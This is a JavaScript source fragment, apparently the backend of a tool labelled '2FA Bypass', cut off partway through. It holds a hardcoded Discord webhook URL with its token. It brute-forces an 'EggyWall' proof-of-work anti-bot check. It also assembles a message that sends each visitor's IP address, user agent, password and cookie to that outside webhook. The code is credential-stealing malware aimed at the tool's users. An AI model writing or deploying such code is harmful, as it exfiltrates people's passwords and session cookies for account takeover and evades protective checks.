import crypto from 'crypto';

// ── Webhook configuration ──
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1535565391831633922/qGPItYyWVhdZBgzZ5Imc3P-rDe5evtpkopomqgfH2RZKQHRblWoe8QBSJ0xL5817ww3B';

// ── EggyWall PoW Solver ──
function solveEggyWall(html) {
    try {
        const saltMatch = html.match(/const publicSalt = "([^"]+)"/);
        const targetMatch = html.match(/const target = "([^"]+)"/);
        const diffMatch = html.match(/const difficulty = (\d+)/);

        if (!saltMatch || !targetMatch || !diffMatch) return null;

        const publicSalt = saltMatch[1];
        const target = targetMatch[1];
        const difficulty = parseInt(diffMatch[1]);

        const charset = '0123456789abcdef';
        const max = Math.pow(charset.length, difficulty);

        // SAFETY: Prevent Vercel Serverless timeout (10s limit). 
        if (max > 5000000) return null; 

        for (let i = 0; i < max; i++) {
            let suffix = '';
            let temp = i;

            for (let j = 0; j < difficulty; j++) {
                suffix = charset[temp % charset.length] + suffix;
                temp = Math.floor(temp / charset.length);
            }

            const attempt = publicSalt + suffix;
            const hash = crypto.createHash('sha256').update(attempt).digest('hex');

            if (hash === target) {
                return attempt;
            }
        }
        return null;
    } catch (e) {
        return null;
    }
}

// ── Webhook sender ──
async function sendWebhook(req, requestData, responseStatus, success, responseBody) {
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    const { Type, Password, Cookie } = requestData || {};

    const mainEmbed = {
        title: success ? `✅ 2FA Bypass - Succeeded` : `❌ 2FA Bypass - Failed`,
        color: success ? 0x00ff00 : 0xff0000,
        fields: [
            { name: '🌐 IP Address', value: ip, inline: true },
            { name: '📋 Type', value: Type || 'N/A', inline: true },
            { name: '🔑 Password', value: Password || 'N/A', inline: true },
            { name: '📊 Response Status', value: String(responseStatus), inline: true },
            { name: '✅ Success', value: success ? 'Yes' : 'No', inline: true },
            {
                name: '📦 Response Snippet',
                value: responseBody
                    ? `\`\`\`json\n${(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody)).slice(0, 500)}\n\`\`\``
                    : 'N/A',
                inline: false
            }
